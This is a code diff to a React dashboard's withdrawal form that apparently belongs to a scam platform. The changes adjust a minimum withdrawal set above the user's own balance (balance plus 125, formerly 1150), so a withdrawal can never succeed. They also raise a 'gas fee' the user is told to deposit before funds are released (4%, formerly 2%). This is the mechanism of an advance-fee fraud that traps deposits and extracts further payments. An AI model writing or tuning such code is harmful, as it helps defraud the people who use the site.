@@ -447,17 +447,17 @@ export default function Dashboard() {
                 value={withdrawAmount}
                 onChange={(e) => setWithdrawAmount(Number(e.target.value))}
                 className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                min={user.balance + 1150} // ✅ dynamic minimum
+                min={user.balance + 125} // ✅ dynamic minimum
               />
               <p className="text-xs text-gray-500 mt-1">
-                Minimum withdrawal: {formatCurrency(user.balance + 1150)}
+                Minimum withdrawal: {formatCurrency(user.balance + 125)}
               </p>
             </div>
 
             {/* Confirm Button */}
             <button
               onClick={() => {
-                const minimumRequired = user.balance + 1150;
+                const minimumRequired = user.balance + 125;
 
                 if (withdrawAmount < minimumRequired) {
                   const shortfall = minimumRequired - user.balance;
@@ -484,8 +484,8 @@ export default function Dashboard() {
                     `Withdrawal request confirmed!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                       withdrawAmount
                     )}\n\nInstruction: Please deposit ${formatCurrency(
-                      withdrawAmount * 0.02
-                    )} (2% gas fee) into your own wallet address to complete the withdrawal.`
+                      withdrawAmount * 0.04
+                    )} (4% gas fee) into your own wallet address to complete the withdrawal.`
                   );
                 }
 
